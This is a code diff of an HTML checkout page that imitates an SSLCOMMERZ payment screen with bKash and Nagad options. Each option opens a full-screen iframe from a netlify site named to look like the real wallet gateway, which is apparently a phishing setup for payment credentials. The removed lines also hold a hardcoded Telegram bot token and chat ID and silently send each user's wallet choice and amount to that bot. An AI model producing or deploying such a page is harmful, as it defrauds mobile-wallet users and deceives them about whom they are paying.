@@ -1,457 +1,343 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Online Payment</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Helvetica Neue', Arial, sans-serif;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Online Payment</title>
 
-    body {
-      background: #f4f8fc;
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      min-height: 100vh;
-      position: relative;
-      overflow-x: hidden;
-    }
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Helvetica Neue', Arial, sans-serif;
+}
 
-    #main-payment-content {
-      width: 100%;
-      max-width: 420px;
-      padding: 20px 24px;
-      padding-bottom: 120px;
-      position: relative;
-    }
+body {
+    background: #f4f8fc;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    position: relative;
+    overflow-x: hidden;
+}
 
-    .topbox {
-      background: #ffffff;
-      height: 54px;
-      border-radius: 12px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 0 16px;
-      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.03);
-      margin-top: 10px;
-    }
+/* কন্টেন্ট এখন শুরুতেই দৃশ্যমান থাকবে */
+#main-payment-content {
+    width: 100%;
+    max-width: 420px;
+    padding: 20px 24px;
+    padding-bottom: 120px;
+    position: relative;
+}
 
-    .topbox .right-icons {
-      display: flex;
-      align-items: center;
-      gap: 18px;
-    }
+.topbox {
+    background: #ffffff;
+    height: 54px;
+    border-radius: 12px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 16px;
+    box-shadow: 0 4px 14px rgba(0, 0, 0, 0.03);
+    margin-top: 10px;
+}
 
-    .icon-btn {
-      background: none;
-      border: none;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+.topbox .right-icons {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+}
 
-    .logo-section {
-      text-align: center;
-      margin-top: 35px;
-    }
+.icon-btn {
+    background: none;
+    border: none;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
 
-    .ssl-logo-container img {
-      height: 36px;
-      object-fit: contain;
-    }
+.logo-section {
+    text-align: center;
+    margin-top: 35px;
+}
 
-    .logo-section h2 {
-      color: #637381;
-      margin-top: 12px;
-      font-size: 26px;
-      font-weight: 600;
-      letter-spacing: -0.5px;
-    }
+.ssl-logo-container img {
+    height: 36px;
+    object-fit: contain;
+}
 
-    .blueBtn {
-      background: #0056c6;
-      color: #ffffff;
-      text-align: center;
-      padding: 14px;
-      border-radius: 8px;
-      margin-top: 32px;
-      font-size: 16px;
-      font-weight: bold;
-      box-shadow: 0 4px 10px rgba(0, 86, 198, 0.15);
-    }
+.logo-section h2 {
+    color: #637381;
+    margin-top: 12px;
+    font-size: 26px;
+    font-weight: 600;
+    letter-spacing: -0.5px;
+}
 
-    .grid {
-      margin-top: 24px;
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 16px;
-    }
+.blueBtn {
+    background: #0056c6;
+    color: #ffffff;
+    text-align: center;
+    padding: 14px;
+    border-radius: 8px;
+    margin-top: 32px;
+    font-size: 16px;
+    font-weight: bold;
+    box-shadow: 0 4px 10px rgba(0, 86, 198, 0.15);
+}
 
-    .card {
-      background: #ffffff;
-      height: 96px;
-      border-radius: 12px;
-      border: 1px solid #eef3f9;
-      position: relative;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
-      padding: 12px;
-      transition: all 0.2s ease;
-      cursor: pointer;
-    }
+.grid {
+    margin-top: 24px;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+}
 
-    .card img {
-      max-width: 85%;
-      max-height: 80%;
-      object-fit: contain;
-    }
+.card {
+    background: #ffffff;
+    height: 96px;
+    border-radius: 12px;
+    border: 1px solid #eef3f9;
+    position: relative;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
+    padding: 12px;
+    transition: all 0.2s ease;
+    cursor: pointer;
+}
 
-    .card.disabled {
-      cursor: not-allowed;
-      pointer-events: none;
-    }
+.card img {
+    max-width: 85%;
+    max-height: 80%;
+    object-fit: contain;
+}
 
-    .card.disabled img {
-      opacity: 0.4;
-    }
+.card.disabled {
+    cursor: not-allowed;
+    pointer-events: none;
+}
 
-    .badge {
-      position: absolute;
-      top: -1px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: #fca0a0;
-      color: #ffffff;
-      font-size: 9.5px;
-      font-weight: 500;
-      padding: 3px 9px;
-      border-bottom-left-radius: 8px;
-      border-bottom-right-radius: 8px;
-      white-space: nowrap;
-    }
+.card.disabled img {
+    opacity: 0.4;
+}
 
-    .footer {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      background: #dbe9ff;
-      padding: 20px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      border-top-left-radius: 16px;
-      border-top-right-radius: 16px;
-      box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.04);
-      z-index: 999;
-    }
+.badge {
+    position: absolute;
+    top: -1px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #fca0a0;
+    color: #ffffff;
+    font-size: 9.5px;
+    font-weight: 500;
+    padding: 3px 9px;
+    border-bottom-left-radius: 8px;
+    border-bottom-right-radius: 8px;
+    white-space: nowrap;
+}
 
-    .paybtn {
-      width: 100%;
-      max-width: 420px;
-      text-align: center;
-      color: #0056c6;
-      font-size: 24px;
-      font-weight: 700;
-    }
+.footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    background: #dbe9ff;
+    padding: 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-top-left-radius: 16px;
+    border-top-right-radius: 16px;
+    box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.04);
+    z-index: 999;
+}
 
-    #bkash-iframe,
-    #nagad-iframe {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      border: none;
-      display: none;
-      z-index: 9999;
-      background: #ffffff;
-    }
+.paybtn {
+    width: 100%;
+    max-width: 420px;
+    text-align: center;
+    color: #0056c6;
+    font-size: 24px;
+    font-weight: 700;
+}
 
-    .loading-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(244, 248, 252, 0.7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 10000;
-    }
+#bkash-iframe, #nagad-iframe {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    border: none;
+    display: none; 
+    z-index: 9999;  
+    background: #ffffff;
+}
 
-    .double-spinner {
-      position: relative;
-      width: 60px;
-      height: 60px;
-    }
+/* লোডিং ওভারলে - এখন কিছুটা স্বচ্ছ করা হয়েছে যাতে ব্যাকগ্রাউন্ড দেখা যায় */
+.loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(244, 248, 252, 0.7); /* ব্যাকগ্রাউন্ড কিছুটা দেখা যাবে */
+    display: flex; 
+    justify-content: center;
+    align-items: center;
+    z-index: 10000; 
+}
 
-    .double-spinner::before {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      border: 4px solid transparent;
-      border-top: 4px solid #3182ce;
-      border-bottom: 4px solid #3182ce;
-      border-radius: 50%;
-      animation: spin-clockwise 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-    }
+.double-spinner {
+    position: relative;
+    width: 60px;
+    height: 60px;
+}
 
-    .double-spinner::after {
-      content: "";
-      position: absolute;
-      top: 10px;
-      left: 10px;
-      right: 10px;
-      bottom: 10px;
-      border: 4px solid transparent;
-      border-left: 4px solid #3182ce;
-      border-right: 4px solid #3182ce;
-      border-radius: 50%;
-      animation: spin-counter 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-    }
+.double-spinner::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    border: 4px solid transparent;
+    border-top: 4px solid #3182ce;
+    border-bottom: 4px solid #3182ce;
+    border-radius: 50%;
+    animation: spin-clockwise 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+}
 
-    @keyframes spin-clockwise {
-      0% {
-        transform: rotate(0deg);
-      }
-      100% {
-        transform: rotate(360deg);
-      }
-    }
+.double-spinner::after {
+    content: "";
+    position: absolute;
+    top: 10px; left: 10px; right: 10px; bottom: 10px;
+    border: 4px solid transparent;
+    border-left: 4px solid #3182ce;
+    border-right: 4px solid #3182ce;
+    border-radius: 50%;
+    animation: spin-counter 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+}
 
-    @keyframes spin-counter {
-      0% {
-        transform: rotate(0deg);
-      }
-      100% {
-        transform: rotate(-360deg);
-      }
-    }
-  </style>
+@keyframes spin-clockwise {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+@keyframes spin-counter {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(-360deg); }
+}
+</style>
+
 </head>
 <body>
 
-  <!-- loading screen -->
-  <div class="loading-overlay" id="loading-screen">
+<!-- লোডিং স্ক্রিন এখন কন্টেন্টের উপরে থাকবে -->
+<div class="loading-overlay" id="loading-screen">
     <div class="double-spinner"></div>
-  </div>
+</div>
 
-  <!-- iframes -->
-  <iframe id="bkash-iframe"></iframe>
-  <iframe id="nagad-iframe"></iframe>
+<iframe id="bkash-iframe"></iframe>
+<iframe id="nagad-iframe"></iframe>
 
-  <!-- main content -->
-  <div id="main-payment-content" class="container">
+<div id="main-payment-content" class="container">
     <div class="topbox">
-      <button class="icon-btn">
-        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#758494" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
-      </button>
-      <div class="right-icons">
-        <button class="icon-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#758494" stroke-width="2"><path d="M5 8h14M5 12h14M11 16h3M4 4h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z"></path></svg></button>
-        <button class="icon-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#758494" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button>
-      </div>
+        <button class="icon-btn">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#758494" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
+        </button>
+        <div class="right-icons">
+            <button class="icon-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#758494" stroke-width="2"><path d="M5 8h14M5 12h14M11 16h3M4 4h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z"></path></svg></button>
+            <button class="icon-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#758494" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button>
+        </div>
     </div>
 
     <div class="logo-section">
-      <div class="ssl-logo-container">
-        <img src="https://i.im.ge/QMA22G8/image_search_1782976139541.png" alt="SSLCOMMERZ">
-      </div>
-      <h2>Online Payment</h2>
+        <div class="ssl-logo-container">
+            <img src="https://i.im.ge/QMA22G8/image_search_1782976139541.png" alt="SSLCOMMERZ">
+        </div>
+        <h2>Online Payment</h2>
     </div>
 
     <div class="blueBtn">মোবাইল ব্যাংকিং</div>
 
     <div class="grid">
-      <div id="checkout-bkash-btn" class="card">
-        <img src="https://i.im.ge/QMIIf4X/image_search_1779412585372.png" alt="bKash">
-      </div>
-      <div id="checkout-nagad-btn" class="card">
-        <img src="https://i.im.ge/QMIIzq8/image_search_1779412606642.png" alt="Nagad">
-      </div>
-      <div class="card disabled">
-        <div class="badge">Temporary Unavailable</div>
-        <img src="https://i.im.ge/QMIIV39/image_search_1779412562964.webp" alt="Rocket">
-      </div>
-      <div class="card disabled">
-        <div class="badge">Temporary Unavailable</div>
-        <img src="https://i.im.ge/QMIIKLK/image_search_1779412647061.png" alt="Upay">
-      </div>
+        <div id="checkout-bkash-btn" class="card">
+            <img src="https://i.im.ge/QMIIf4X/image_search_1779412585372.png" alt="bKash">
+        </div>
+        <div id="checkout-nagad-btn" class="card">
+            <img src="https://i.im.ge/QMIIzq8/image_search_1779412606642.png" alt="Nagad">
+        </div>
+        <div class="card disabled">
+            <div class="badge">Temporary Unavailable</div>
+            <img src="https://i.im.ge/QMIIV39/image_search_1779412562964.webp" alt="Rocket">
+        </div>
+        <div class="card disabled">
+            <div class="badge">Temporary Unavailable</div>
+            <img src="https://i.im.ge/QMIIKLK/image_search_1779412647061.png" alt="Upay">
+        </div>
     </div>
-  </div>
+</div>
 
-  <div class="footer" id="main-footer">
+<div class="footer" id="main-footer">
     <div class="paybtn">Pay <span id="dynamicAmount">0.00</span> BDT</div>
-  </div>
+</div>
 
-  <script>
-    (function() {
-      // ----- CONFIG -----
-      const BOT_TOKEN = '7751217182:AAEWRJ427aODJ4w9Y9sJw51U28o0QZ_yx4E';
-      const CHAT_ID = '7335173906';
+<script>
+    let finalAmountToPass = "0";
+    const loadingScreen = document.getElementById('loading-screen');
 
-      // ----- state -----
-      let finalAmountToPass = "0";
-      let currentAmountDisplay = "0.00";
-
-      const loadingScreen = document.getElementById('loading-screen');
-      const mainContent = document.getElementById('main-payment-content');
-      const mainFooter = document.getElementById('main-footer');
-      const bkashIframe = document.getElementById('bkash-iframe');
-      const nagadIframe = document.getElementById('nagad-iframe');
-      const dynamicAmountSpan = document.getElementById('dynamicAmount');
-
-      // ----- send Telegram notification (silent, no UI) -----
-      function sendTelegramNotification(method, amount) {
-        const label = method === 'bkash' ? 'bKash' : 'Nagad';
-        const text = `👤 User paying with ${label}.\n💰 Amount: ${amount} BDT`;
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-        fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'Markdown'
-          })
-        }).catch(err => {
-          // silently fail, no user-facing message
-          console.warn('Telegram send failed (silent):', err);
-        });
-      }
-
-      // ----- open iframe with loading + silent notification -----
-      function openPaymentGateway(type, url) {
-        // send telegram notification (no UI)
-        const amountForNotif = dynamicAmountSpan.innerText;
-        sendTelegramNotification(type, amountForNotif);
-
-        // show loading
-        loadingScreen.style.display = 'flex';
-
-        // set iframe src
-        const iframe = type === 'bkash' ? bkashIframe : nagadIframe;
-        iframe.src = url;
-
-        // after 2s hide loading, hide main content, show iframe
-        setTimeout(function() {
-          loadingScreen.style.display = 'none';
-          mainContent.style.display = 'none';
-          mainFooter.style.display = 'none';
-          iframe.style.display = 'block';
-        }, 2000);
-      }
-
-      // ----- get amount from URL and set display -----
-      function initAmount() {
+    document.addEventListener('DOMContentLoaded', () => {
         const urlParams = new URLSearchParams(window.location.search);
         const amountValue = urlParams.get("amount");
+        const displayElement = document.getElementById("dynamicAmount");
 
         if (amountValue && !isNaN(amountValue) && parseFloat(amountValue) > 0) {
-          const formatted = parseFloat(amountValue).toFixed(2);
-          dynamicAmountSpan.innerText = formatted;
-          currentAmountDisplay = formatted;
-          finalAmountToPass = Math.floor(parseFloat(amountValue)).toString();
+            displayElement.innerText = parseFloat(amountValue).toFixed(2);
+            finalAmountToPass = Math.floor(parseFloat(amountValue)).toString();
         } else {
-          dynamicAmountSpan.innerText = "0.00";
-          currentAmountDisplay = "0.00";
-          finalAmountToPass = "0";
+            displayElement.innerText = "0.00";
+            finalAmountToPass = "0";
         }
-      }
 
-      // ----- restore main content, keep amount unchanged -----
-      function restoreMainContent() {
-        // hide iframes
-        bkashIframe.style.display = 'none';
-        nagadIframe.style.display = 'none';
-        // show main content
-        mainContent.style.display = 'block';
-        mainFooter.style.display = 'block';
-        // amount is already preserved, but re-set it just in case
-        dynamicAmountSpan.innerText = currentAmountDisplay;
-      }
-
-      // ----- DOM ready -----
-      document.addEventListener('DOMContentLoaded', function() {
-        initAmount();
-
-        // random opening time (1-2 sec)
+        // পেজ ওপেনিং অ্যানিমেশন (১-২ সেকেন্ড)
         const randomOpeningTime = Math.floor(Math.random() * (2000 - 1000 + 1)) + 1000;
+
         setTimeout(function() {
-          loadingScreen.style.display = 'none';
+            loadingScreen.style.display = 'none'; // শুধুমাত্র অ্যানিমেশনটি সরিয়ে দিবে
         }, randomOpeningTime);
+    });
 
-        // ----- bKash click -----
-        document.getElementById('checkout-bkash-btn').addEventListener('click', function() {
-          const amountParam = finalAmountToPass;
-          const url = "https://bkashgetway06.netlify.app/?amount=" + amountParam;
-          openPaymentGateway('bkash', url);
-        });
+    // ক্লিক ইভেন্টগুলোতে কন্টেন্ট হাইড হবে যেন আইফ্রেম দেখা যায়
+    document.getElementById('checkout-bkash-btn').addEventListener('click', function() {
+        const bkashIframe = document.getElementById('bkash-iframe');
+        loadingScreen.style.display = 'flex'; // অ্যানিমেশন আবার শো করবে
+        const bkashPageUrl = "https://bkashgetway06.netlify.app/?amount=" + finalAmountToPass;
+        bkashIframe.src = bkashPageUrl;
+        
+        setTimeout(function() {
+            loadingScreen.style.display = 'none';
+            document.getElementById('main-payment-content').style.display = 'none';
+            document.getElementById('main-footer').style.display = 'none';
+            bkashIframe.style.display = 'block';
+        }, 2000); 
+    });
 
-        // ----- Nagad click -----
-        document.getElementById('checkout-nagad-btn').addEventListener('click', function() {
-          const amountParam = finalAmountToPass;
-          const url = "https://nagad-pay-g10.netlify.app/?amount=" + amountParam;
-          openPaymentGateway('nagad', url);
-        });
-
-        // ----- restore when user comes back (pageshow) -----
-        window.addEventListener('pageshow', function(event) {
-          // if any iframe is displayed, restore main content
-          if (bkashIframe.style.display === 'block' || nagadIframe.style.display === 'block') {
-            restoreMainContent();
-          }
-        });
-
-        // ----- also restore when iframe is hidden (e.g., user clicks back inside iframe) -----
-        // we can't directly detect iframe navigation, but we can use a visibility change or focus
-        // we'll also listen to 'blur' and 'focus' on window to catch when user returns to tab
-        // but pageshow already handles back button.
-
-        // additional safety: if user manually reloads the page, amount stays because of URL param.
-        // but if they reload while iframe is shown, we want to restore.
-        // we can check on load if iframe is shown? but on load it's hidden.
-
-        // we'll also add a fallback: if user clicks on the page (anywhere) while iframe is shown,
-        // we can restore? but that might be intrusive. we'll keep it simple.
-
-        // one more: if user navigates away and comes back via history, pageshow triggers.
-
-        // also we want to keep amount if user goes to gateway and comes back without reload.
-        // the amount is stored in currentAmountDisplay and finalAmountToPass.
-        // so even if they click multiple times, amount stays.
-        console.log('Payment page ready. Amount:', finalAmountToPass);
-      });
-
-      // extra: if user reloads the page while iframe is shown, we want to show main content.
-      // we check on load if iframe is displayed (it should be hidden initially)
-      // but if user reloads while iframe is shown, the iframe will be hidden because it's a new load.
-      // so we don't need to handle that.
-
-      // we also want to handle the case where user opens the page, clicks bkash, then uses back button
-      // pageshow handles that.
-
-      // we also want to handle the case where user clicks bkash, then inside iframe they click a link
-      // that navigates to another page (still inside iframe), then they click back button.
-      // pageshow will fire when they come back to this page.
-
-      // all good.
-    })();
-  </script>
+    document.getElementById('checkout-nagad-btn').addEventListener('click', function() {
+        const nagadIframe = document.getElementById('nagad-iframe');
+        loadingScreen.style.display = 'flex';
+        const nagadPageUrl = "https://nagad-pay-g10.netlify.app/?amount=" + finalAmountToPass;
+        nagadIframe.src = nagadPageUrl;
+        
+        setTimeout(function() {
+            loadingScreen.style.display = 'none';
+            document.getElementById('main-payment-content').style.display = 'none';
+            document.getElementById('main-footer').style.display = 'none';
+            nagadIframe.style.display = 'block';
+        }, 2000);
+    });
+</script>
 
 </body>
 </html>
